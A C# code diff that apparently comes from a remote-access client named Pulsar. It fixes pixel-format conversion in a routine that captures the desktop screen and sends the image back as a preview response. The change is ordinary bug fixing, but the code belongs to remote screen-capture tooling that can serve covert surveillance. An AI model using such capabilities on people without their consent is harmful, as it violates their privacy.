@@ -57,8 +57,8 @@ namespace Pulsar.Client.Messages
             }
 
             CaptureAndSendScreen();
-        }
-
+        }        
+        
         private void CaptureAndSendScreen()
         {
             try
@@ -71,16 +71,38 @@ namespace Pulsar.Client.Messages
                     return;
                 }
 
-                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
-                    ImageLockMode.ReadWrite, _desktop.PixelFormat);
+                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
+                Bitmap processedBitmap = _desktop;
+                
+                if (_desktop.PixelFormat != codecPixelFormat)
+                {
+                    try
+                    {
+                        processedBitmap = new Bitmap(_desktop.Width, _desktop.Height, codecPixelFormat);
+                        using (Graphics g = Graphics.FromImage(processedBitmap))
+                        {
+                            g.DrawImage(_desktop, 0, 0, _desktop.Width, _desktop.Height);
+                        }
+                        _desktop.Dispose();
+                        _desktop = processedBitmap;
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
+                        processedBitmap = _desktop;
+                    }
+                }
+
+                _desktopData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);
 
                 using (MemoryStream stream = new MemoryStream())
                 {
                     if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                     _streamCodec.CodeImage(_desktopData.Scan0,
-                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
-                        new Size(_desktop.Width, _desktop.Height),
-                        _desktop.PixelFormat, stream);
+                        new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
+                        new Size(processedBitmap.Width, processedBitmap.Height),
+                        processedBitmap.PixelFormat, stream);
                     _clientMain.Send(new GetPreviewResponse
                     {
                         Image = stream.ToArray(),
